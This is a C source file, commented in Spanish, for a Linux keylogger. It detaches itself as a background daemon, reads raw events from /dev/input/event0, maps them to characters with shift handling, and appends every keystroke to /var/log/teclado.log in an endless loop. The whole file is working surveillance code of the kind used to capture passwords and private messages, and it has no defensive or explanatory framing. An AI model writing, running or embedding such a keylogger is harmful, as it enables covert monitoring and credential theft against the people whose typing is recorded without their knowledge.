#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <syslog.h>

#define KEYBOARD_DEVICE "/dev/input/event0" // Ajusta esto a tu dispositivo real
#define LOG_FILE "/var/log/teclado.log"

void daemonize() {
    pid_t pid = fork();

    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Termina el padre

    umask(0);
    setsid();
    chdir("/");

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

const char* keymap_normal[256] = {
    [KEY_A] = "a", [KEY_B] = "b", [KEY_C] = "c", [KEY_D] = "d",
    [KEY_E] = "e", [KEY_F] = "f", [KEY_G] = "g", [KEY_H] = "h",
    [KEY_I] = "i", [KEY_J] = "j", [KEY_K] = "k", [KEY_L] = "l",
    [KEY_M] = "m", [KEY_N] = "n", [KEY_O] = "o", [KEY_P] = "p",
    [KEY_Q] = "q", [KEY_R] = "r", [KEY_S] = "s", [KEY_T] = "t",
    [KEY_U] = "u", [KEY_V] = "v", [KEY_W] = "w", [KEY_X] = "x",
    [KEY_Y] = "y", [KEY_Z] = "z",

    [KEY_1] = "1", [KEY_2] = "2", [KEY_3] = "3", [KEY_4] = "4",
    [KEY_5] = "5", [KEY_6] = "6", [KEY_7] = "7", [KEY_8] = "8",
    [KEY_9] = "9", [KEY_0] = "0",

    [KEY_SPACE] = " ", [KEY_ENTER] = "\n", [KEY_BACKSPACE] = "\b",
    [KEY_COMMA] = ",", [KEY_DOT] = ".", [KEY_SLASH] = "/",
    [KEY_SEMICOLON] = ";", [KEY_APOSTROPHE] = "'", [KEY_LEFTBRACE] = "[",
    [KEY_RIGHTBRACE] = "]", [KEY_MINUS] = "-", [KEY_EQUAL] = "=",
    [KEY_BACKSLASH] = "\\", [KEY_GRAVE] = "`",

    [KEY_KP0] = "0", [KEY_KP1] = "1", [KEY_KP2] = "2",
    [KEY_KP3] = "3", [KEY_KP4] = "4", [KEY_KP5] = "5",
    [KEY_KP6] = "6", [KEY_KP7] = "7", [KEY_KP8] = "8",
    [KEY_KP9] = "9",

    [KEY_KPDOT] = ".", [KEY_KPSLASH] = "/", [KEY_KPASTERISK] = "*",
    [KEY_KPMINUS] = "-", [KEY_KPPLUS] = "+", [KEY_KPENTER] = "[ENTER]"

};

const char* keymap_shift[256] = {
    [KEY_A] = "A", [KEY_B] = "B", [KEY_C] = "C", [KEY_D] = "D",
    [KEY_E] = "E", [KEY_F] = "F", [KEY_G] = "G", [KEY_H] = "H",
    [KEY_I] = "I", [KEY_J] = "J", [KEY_K] = "K", [KEY_L] = "L",
    [KEY_M] = "M", [KEY_N] = "N", [KEY_O] = "O", [KEY_P] = "P",
    [KEY_Q] = "Q", [KEY_R] = "R", [KEY_S] = "S", [KEY_T] = "T",
    [KEY_U] = "U", [KEY_V] = "V", [KEY_W] = "W", [KEY_X] = "X",
    [KEY_Y] = "Y", [KEY_Z] = "Z",

    [KEY_1] = "!", [KEY_2] = "@", [KEY_3] = "#", [KEY_4] = "$",
    [KEY_5] = "%", [KEY_6] = "^", [KEY_7] = "&", [KEY_8] = "*",
    [KEY_9] = "(", [KEY_0] = ")",

    [KEY_SPACE] = " ", [KEY_ENTER] = "\n", [KEY_BACKSPACE] = "\b",
    [KEY_COMMA] = "<", [KEY_DOT] = ">", [KEY_SLASH] = "?",
    [KEY_SEMICOLON] = ":", [KEY_APOSTROPHE] = "\"", [KEY_LEFTBRACE] = "{",
    [KEY_RIGHTBRACE] = "}", [KEY_MINUS] = "_", [KEY_EQUAL] = "+",
    [KEY_BACKSLASH] = "|", [KEY_GRAVE] = "~"
};

// Teclas especiales que se imprimirán con nombre
const char* keymap_special[256] = {
    [KEY_ENTER] = "[ENTER]",
    [KEY_BACKSPACE] = "[BSP]",
    [KEY_SPACE] = "[SPACE]",
    [KEY_TAB] = "[TAB]",
    [KEY_ESC] = "[ESC]"
};

int main() {
    struct input_event ev;
    int shift_pressed = 0;

    daemonize();

    FILE *log = fopen(LOG_FILE, "a+");
    if (!log) exit(EXIT_FAILURE);

    while (1) {
        int fd = open(KEYBOARD_DEVICE, O_RDONLY);
        if (fd < 0) {
            sleep(1);
            continue;
        }

        while (read(fd, &ev, sizeof(struct input_event)) > 0) {
            if (ev.type == EV_KEY) {
                if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                    shift_pressed = ev.value;
                }

                if (ev.value == 1 || ev.value == 2) {
                    if (ev.code != KEY_LEFTSHIFT && ev.code != KEY_RIGHTSHIFT) {
                        const char *output = NULL;

                        if (ev.code == KEY_ENTER) {
                            fprintf(log, "[ENTER]\n");
                            fflush(log);
                            continue;
                        } else if (ev.code == KEY_BACKSPACE) {
                            fprintf(log, "[BSP]");
                            fflush(log);
                            continue;
                        } else if (keymap_special[ev.code]) {
                            output = keymap_special[ev.code];
                        } else {
                            output = shift_pressed ?
                                keymap_shift[ev.code] : keymap_normal[ev.code];
                        }

                        if (output) {
                            fprintf(log, "%s", output);
                            fflush(log);
                        }
                    }
                }
            }
        }

    }

    fclose(log);
    return 0;
}
